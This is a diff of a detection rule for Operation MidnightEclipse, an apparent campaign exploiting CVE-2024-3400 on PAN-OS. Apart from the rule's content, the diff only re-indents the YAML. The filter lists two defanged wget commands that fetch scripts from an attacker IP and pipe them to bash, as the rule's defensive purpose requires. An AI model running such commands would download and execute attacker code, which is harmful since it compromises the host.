@@ -1,35 +1,35 @@
 title: Operation MidnightEclipse - wget to Known Malicious IP
 id: 7f13b29f-0e70-465d-8769-4964277b4ff5
 related:
-    - id: 15b54394-02bb-4a03-8621-f157127cded0
-      type: similar
-    - id: 49e5365d-ac3b-4d54-90d7-1d695a71d376
-      type: similar
-    - id: 57deaee4-dd63-4bb5-b408-29c1967c9cef
-      type: similar
-    - id: 91ce531e-b6b6-45cb-a102-07ad0ed00a97
-      type: similar
+  - id: 15b54394-02bb-4a03-8621-f157127cded0
+    type: similar
+  - id: 49e5365d-ac3b-4d54-90d7-1d695a71d376
+    type: similar
+  - id: 57deaee4-dd63-4bb5-b408-29c1967c9cef
+    type: similar
+  - id: 91ce531e-b6b6-45cb-a102-07ad0ed00a97
+    type: similar
 status: test
 description: Detects Operation MidnightEclipse cron job that gets commands from malicious server exploiting CVE-2024-3400 with UPSTYLE python backdoor.
 references:
-    - https://unit42.paloaltonetworks.com/cve-2024-3400/#post-133365-_ydqdbjg0dngh
+  - https://unit42.paloaltonetworks.com/cve-2024-3400/#post-133365-_ydqdbjg0dngh
 author: Dustin Butterworth
 date: 2024/04/12
 tags:
-    - attack.t1053.003
-    - attack.t1547.001
+  - attack.t1053.003
+  - attack.t1547.001
 logsource:
-    category: process_creation
-    product: pan_os
+  category: process_creation
+  product: pan_os
 detection:
-    selection:
-      event_simpleName:
-        - ProcessRollup2
-    filter:
-      CommandLine:
-        - 'wget -qO- hxxp://172.233.228[.]93/patch|bash'
-        - 'wget -qO- hxxp://172.233.228[.]93/policy | bash'
-    condition: selection and filter
+  selection:
+    event_simpleName:
+      - ProcessRollup2
+  filter:
+    CommandLine:
+      - 'wget -qO- hxxp://172.233.228[.]93/patch|bash'
+      - 'wget -qO- hxxp://172.233.228[.]93/policy | bash'
+  condition: selection and filter
 falsepositives:
-    - Unknown
+  - Unknown
 level: critical
